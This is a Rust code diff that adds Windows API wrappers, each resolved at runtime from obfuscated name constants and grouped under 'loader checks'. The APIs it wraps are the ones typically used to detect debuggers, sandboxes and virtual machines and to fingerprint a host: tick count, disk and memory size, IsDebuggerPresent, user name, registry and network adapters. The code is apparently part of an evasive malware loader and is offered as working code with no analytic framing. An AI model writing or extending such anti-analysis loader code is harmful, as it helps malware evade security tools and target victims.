@@ -516,3 +516,61 @@ pub unsafe fn GetComputerNameA(buffer: *mut u8, size: *mut u32) -> i32 {
     let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_COMPUTER_NAME_A));
     f(buffer, size)
 }
+
+// ── kernel32 loader checks ──────────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn GetTickCount64() -> u64 {
+    type F = unsafe extern "system" fn() -> u64;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_TICK_COUNT_64));
+    f()
+}
+
+#[cfg(windows)]
+pub unsafe fn GetDiskFreeSpaceExA(dir: *const u8, free_caller: *mut u64, total: *mut u64, free_total: *mut u64) -> i32 {
+    type F = unsafe extern "system" fn(*const u8, *mut u64, *mut u64, *mut u64) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GET_DISK_FREE_SPACE_EX_A));
+    f(dir, free_caller, total, free_total)
+}
+
+#[cfg(windows)]
+pub unsafe fn GlobalMemoryStatusEx(buffer: *mut c_void) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void) -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_GLOBAL_MEMORY_STATUS_EX));
+    f(buffer)
+}
+
+#[cfg(windows)]
+pub unsafe fn IsDebuggerPresent() -> i32 {
+    type F = unsafe extern "system" fn() -> i32;
+    let f: F = std::mem::transmute(resolve(K32, crate::obf::W_IS_DEBUGGER_PRESENT));
+    f()
+}
+
+// ── advapi32 loader checks ─────────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn GetUserNameA(buffer: *mut u8, size: *mut u32) -> i32 {
+    type F = unsafe extern "system" fn(*mut u8, *mut u32) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_GET_USER_NAME_A));
+    f(buffer, size)
+}
+
+#[cfg(windows)]
+pub unsafe fn RegQueryValueExA(
+    key: *mut c_void, name: *const u8, reserved: *mut u32, reg_type: *mut u32,
+    data: *mut u8, data_len: *mut u32,
+) -> i32 {
+    type F = unsafe extern "system" fn(*mut c_void, *const u8, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::ADVAPI32, crate::obf::W_REG_QUERY_VALUE_EX_A));
+    f(key, name, reserved, reg_type, data, data_len)
+}
+
+// ── iphlpapi loader checks ─────────────────────────────────────────────
+
+#[cfg(windows)]
+pub unsafe fn GetAdaptersInfo(info: *mut c_void, size: *mut u32) -> u32 {
+    type F = unsafe extern "system" fn(*mut c_void, *mut u32) -> u32;
+    let f: F = std::mem::transmute(resolve_load(crate::obf::IPHLPAPI, crate::obf::W_GET_ADAPTERS_INFO));
+    f(info, size)
+}
